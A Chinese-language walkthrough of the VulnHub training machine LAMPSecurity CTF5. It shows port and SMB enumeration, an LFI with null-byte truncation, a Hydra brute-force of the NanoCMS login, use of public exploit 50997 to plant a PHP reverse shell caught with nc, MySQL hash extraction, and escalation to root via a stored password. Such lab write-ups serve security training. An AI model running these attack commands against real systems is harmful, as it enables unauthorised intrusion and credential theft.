# LAMPSecurity：CTF5

2024-6-3 https://www.vulnhub.com/entry/lampsecurity-ctf5,84/

difficulty: easy

## IP

101.1.0.166

## Scan

Open Port -> 22,25,80,110,111,139,143,445,901,3306,56756

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey:
|   1024 05c3aa152b57c7f42bd3411c7476cd3d (DSA)
|_  2048 43fa3c08abe78b39c3d6f3a45419fea6 (RSA)
25/tcp    open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello [101.1.0.8], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))
|_http-server-header: Apache/2.2.6 (Fedora)
|_http-title: Phake Organization
110/tcp   open  pop3        ipop3d 2006k.101
|_ssl-date: 2024-06-02T09:12:51+00:00; -3h58m22s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_pop3-capabilities: UIDL TOP USER LOGIN-DELAY(180) STLS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100024  1          32768/udp   status
|_  100024  1          56756/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-04-29T11:31:53
|_Not valid after:  2010-04-29T11:31:53
|_ssl-date: 2024-06-02T09:12:51+00:00; -3h58m22s from scanner time.
|_imap-capabilities: UIDPLUS CHILDREN WITHIN MULTIAPPEND UNSELECT BINARY THREAD=REFERENCES SCAN completed IDLE SASL-IR MAILBOX-REFERRALS LOGIN-REFERRALS STARTTLSA0001 CAPABILITY OK IMAP4REV1 SORT THREAD=ORDEREDSUBJECT NAMESPACE LITERAL+ ESEARCH
445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth:
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp  open  mysql       MySQL 5.0.45
| mysql-info:
|   Protocol: 10
|   Version: 5.0.45
|   Thread ID: 4
|   Capabilities flags: 41516
|   Some Capabilities: Support41Auth, SupportsTransactions, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: REDbBbEs6OlR6T%Xl9ua
```

开放的端口很多，估计有一些是坑。

22 ssh 端口先不看，25 和 110 邮件服务端口暂时不看，没有用户名和密码。

先看看 smb 上有什么信息：

```
enum4linux -a 101.1.0.166

user:[loren] rid:[0x7d6]
user:[jennifer] rid:[0x7d2]
user:[amy] rid:[0x7d8]
user:[andy] rid:[0x7d4]
user:[patrick] rid:[0x7d0]
```

发现几个用户 loren jennifer amy andy patrick

```
smbclient -L //101.1.0.166 -N

Sharename       Type      Comment
---------       ----      -------
homes           Disk      Home Directories
IPC$            IPC       IPC Service (Samba Server Version 3.0.26a-6.fc8)
```

smb 没有检索出相关映射信息。

3306 mysql 没有 root 用户密码，暂时也没提权路径。

http://101.1.0.166:901/ 901 端口需要 http basic 认证，尝试 admin:admin 没有成功。

看看 80 的 web 服务吧，首页上有几个菜单，源码中也没什么隐藏信息，使用 gobuster 先看看有没有隐藏页面：

```
gobuster -t 64 dir -u http://101.1.0.166/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://101.1.0.166/index.php            (Status: 200) [Size: 1538]
http://101.1.0.166/events               (Status: 301) [Size: 310] [--> http://101.1.0.166/events/]
http://101.1.0.166/info.php             (Status: 200) [Size: 50430]
http://101.1.0.166/mail                 (Status: 301) [Size: 308] [--> http://101.1.0.166/mail/]
http://101.1.0.166/list                 (Status: 301) [Size: 308] [--> http://101.1.0.166/list/]
http://101.1.0.166/inc                  (Status: 301) [Size: 307] [--> http://101.1.0.166/inc/]
http://101.1.0.166/phpmyadmin           (Status: 301) [Size: 314] [--> http://101.1.0.166/phpmyadmin/]
http://101.1.0.166/squirrelmail         (Status: 301) [Size: 316] [--> http://101.1.0.166/squirrelmail/]
```

http://101.1.0.166/info.php 是 phpinfo 页面，看到 php 的版本是 5.2.4 比较老，php 版本<5.3.4，可能存在截断。看到 web root 是 /var/www/html

在 80 的默认首页的菜单上，看到这样的链接 http://101.1.0.166/index.php?page=about 可能存在 LFI，进行修改，看看什么结果：

```
http://101.1.0.166/index.php?page=/etc/passwd

include_once(inc//etc/passwd.php)
```

可以看到是 page 进行了拼接，前面加了 inc/ , 结尾加了.php 后缀，让我们尝试%00 截断：

```
http://101.1.0.166/index.php?page=../../../../../../../../etc/passwd%00

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin
polkituser:x:87:87:PolicyKit:/:/sbin/nologin
avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
gdm:x:42:42::/var/gdm:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash

patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash
jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash
andy:x:502:502:Andrew Carp:/home/andy:/bin/bash
loren:x:503:503:Loren Felt:/home/loren:/bin/bash
amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash
```

看到了我们想要的信息，确实存在 %00 截断。

这时就要寻找相关日志文件，形成 web shell 包含，先进行下 FUZZ：

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://101.1.0.166/index.php?page=../../../../../../../..FUZZ%00 -fl 59

http://101.1.0.166/index.php?page=../../../../../../../../var/apache/logs/access_log%00

http://101.1.0.166/index.php?page=../../../../../../../../home/patrick/.ssh/authorized_keys%00
```

使用 FUZZ 后，没找到相关可读取的 web 日志文件，不能触发 web shell；也没有找到上面几个用户 /home 目录中的.ssh 中的相关密钥文件，因为上面的 LFI 前后加了前缀和后缀，也不能使用 php filter 读取 php 配置文件，看不到数据库相关配置，只好看看其他几个扫描出来的 web 目录。

http://101.1.0.166/events/ 是一个 cms 但是看不出来是哪个，也没找到默认的用户名和密码，尝试了常见的弱密码，也不能登陆。

http://101.1.0.166/phpmyadmin 是 phpmyadmin 尝试常见弱密码，也没登陆成功。

http://101.1.0.166/mail/src/login.php 是 SquirrelMail version 1.4.11-1.fc8，存在漏洞，但是需要用户名和密码凭据，进行测试发现都不匹配。

http://101.1.0.166/squirrelmail 与 http://101.1.0.166/mail 显示的内容相同，也没找到可用的登陆凭据。

注意到 80 web 主页上有一个 blog 按钮，对应的链接是 http://101.1.0.166/~andy/ ，打开后发现是一个 NanoCMS，经过查询，发现这个默认的用户凭据是 admin:demo，但是登陆后，提示不对，尝试用 hydra 进行下密码爆破，发现了登陆密码：

```
hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 101.1.0.166 -f http-post-form "/~andy/data/nanoadmin.php:user=^USER^&pass=^PASS^:F=Username or Password"

[80][http-post-form] host: 101.1.0.166   login: admin   password: shannon
```

使用 admin:shannon 登陆后，发现是 NanoCMS (v0.4-final) ，经过 searchsploit 这个版本存在 rce 漏洞：NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50997.py

尝试利用,上传自己的 php web shell：

```
searchsploit -m 50997

python3 50997.py -u admin -p shannon -e http://101.1.0.166/~andy ./10.3/8888.php

[+] logged in successfully.
[+] file posted.
[i] if successful, file location should be at:
http://101.1.0.166/~andy/data/pages/46a10c84.php
[i] making web request to uploaded file.
[i] check listener if reverse shell uploaded.
```

kali 监听 8888 端口，访问上面的后门链接，触发反弹 shell：

```
nc -lvnp 8888

curl http://101.1.0.166/~andy/data/pages/46a10c84.php
```

kali 上得到了反弹的 shell：

```
bash-3.2$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

先用 python 升级下 tty。

进行系统枚举，sudo、suid、getcap、crontab 等都发现可利用点。

经过在 /var/www/html 中查询，找到了数据库的配置连接:

```
$link = mysql_connect('localhost', 'root', 'mysqlpassword');
```

连接 mysql 数据库，看看数据库中，是否有可利用信息：

```
mysql> use drupal;

mysql> select name, pass from users;
+----------+----------------------------------+
| name     | pass                             |
+----------+----------------------------------+
|          |                                  |
| jennifer | e3f4150c722e6376d87cd4d43fef0bc5 |
| patrick  | 5f4dcc3b5aa765d61d8327deb882cf99 |
| andy     | b64406d23d480b88fe71755b96998a51 |
| loren    | 6c470dd4a0901d53f7ed677828b23cfd |
| amy      | e5f0f20b92f7022779015774e90ce917 |
+----------+----------------------------------+
```

其他几个数据库和其中的表没发现什么有用信息。这 5 个用户和/etc/passwd 中发现的 5 个用户可以对应上，可能就存在有密码是 ssh 密码的情况，看看能不能得到对应的明文密码。

发现 patrick:password lorenpass:lorenpass amy:temppass , 尝试 su 进行用户切换，但是发现这几个用户的 ssh 密码都不是，尝试失败。

看看寻找有没有 pass 存储的地方吧，经过 grep 查找，发现了 pass 存在的地方：

```
grep -Rn pass /home/* 2>/dev/null

/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:3:  <title>Root password</title>

</note>bash-3.2$ cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note
<?xml version="1.0" encoding="utf-8"?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve"><note-content version="0.1">Root password

Root password

50$cent</note-content></text>
  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
  <cursor-position>15</cursor-position>
  <width>450</width>
  <height>360</height>
  <x>0</x>
  <y>0</y>
  <open-on-startup>False</open-on-startup>
```

su root 输入密码 50$cent 成功切换到了 root 用户。
